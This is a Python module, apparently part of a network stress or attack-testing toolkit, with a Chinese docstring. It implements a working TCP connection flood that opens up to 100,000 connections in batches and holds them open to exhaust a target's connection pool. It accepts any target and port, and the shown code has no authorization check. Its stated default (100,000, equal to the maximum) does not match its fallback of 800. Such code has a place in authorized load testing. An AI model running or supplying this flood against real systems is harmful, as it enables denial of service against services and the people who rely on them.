"""
測項：TCP Connection Flood（連線池飽和測試，通用任意 TCP Port）
分類：一般
用途：建立大量完整三方交握的連線並保持開啟，測試目標連線數上限/資源耗盡行為。

實作方式：原生 Python socket + threading，而不是 shell `for i in {1..N}; do nc ... & done`。
原因：
  - 統一由 stop_event 收尾，測試結束/被停止時能確實把所有連線關掉，不會留下殭屍連線；
  - 能精確統計「成功建立幾條、失敗幾條」，寫進報告會比一串背景 nc 行程有意義得多。

攻擊端資源安全性：
  - 這裡建立的是「真正的 OS 執行緒」（threading.Thread），不是 async coroutine；
    大量執行緒一次性 spawn 會在一般 2-4 vCPU 的攻擊端主機上造成明顯的
    context-switch/記憶體開銷，是攻擊端本身變得卡頓的常見成因之一，因此
    concurrent_connections 訂有明確上限（實際上限與預設值見 get_param_schema()）。
  - 同時把「一次性 spawn 全部執行緒」改成「分批（每批 150 條）+ 批次間短暫停頓
    （0.05 秒）」，仍然能在很短時間內（約 0.3~0.4 秒內達到上千條連線）快速衝高
    目標的同時連線數，但不會讓攻擊端一瞬間建立數千條 OS 執行緒。
  - 可搭配攻擊端 self_resource 自我保護監控使用；預設值訂在能對目標連線池造成
    有感壓力、同時仍在安全上限之內的水準，執行時仍可視需要調整。
"""
import socket
import threading
import time

from ..common import clamp_duration

NAME = "TCP Connection Flood（連線池飽和）"
CATEGORY = "一般"
PROTOCOL = "TCP"
TEST_TYPE = "resource"  # 連線型：建立大量完整三方交握連線並長時間持有，屬連線池飽和攻擊

_SPAWN_BATCH_SIZE = 150
_SPAWN_BATCH_STAGGER_SEC = 0.05


def get_param_schema() -> dict:
    return {
        "concurrent_connections": {
            "type": "int", "default": 100000, "min": 1, "max": 100000,
            "desc": "同時維持的連線數（攻擊端以分批方式建立，避免一次性 spawn 過多執行緒）",
        },
        "connect_timeout": {
            "type": "float", "default": 3.0, "min": 0.5, "max": 10.0,
            "desc": "單一連線逾時秒數",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    n = int(params.get("concurrent_connections", 800))
    timeout = float(params.get("connect_timeout", 3.0))

    sockets = []
    lock = threading.Lock()
    stats = {"ok": 0, "fail": 0}

    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            with lock:
                sockets.append(s)
                stats["ok"] += 1
        except OSError:
            with lock:
                stats["fail"] += 1

    log_fn(f"[+] 嘗試建立 {n} 條連線 -> {target}:{port}（分批 spawn，每批 {_SPAWN_BATCH_SIZE} 條）")
    threads = []
    for batch_start in range(0, n, _SPAWN_BATCH_SIZE):
        if stop_event is not None and stop_event.is_set():
            log_fn("[!] stop_event 觸發，停止繼續建立新連線")
            break
        batch = [threading.Thread(target=open_one, daemon=True) for _ in range(min(_SPAWN_BATCH_SIZE, n - batch_start))]
        for t in batch:
            t.start()
        threads.extend(batch)
        if batch_start + _SPAWN_BATCH_SIZE < n:
            time.sleep(_SPAWN_BATCH_STAGGER_SEC)
    for t in threads:
        t.join(timeout=timeout + 1)

    log_fn(f"[+] 成功 {stats['ok']} 條，失敗 {stats['fail']} 條，維持連線至測試結束或被停止")

    start = time.time()
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        time.sleep(1)

    log_fn("[+] 關閉所有連線")
    for s in sockets:
        try:
            s.close()
        except OSError:
            pass

    return {
        "opened": stats["ok"],
        "failed": stats["fail"],
        "elapsed_sec": round(time.time() - start, 1),
    }
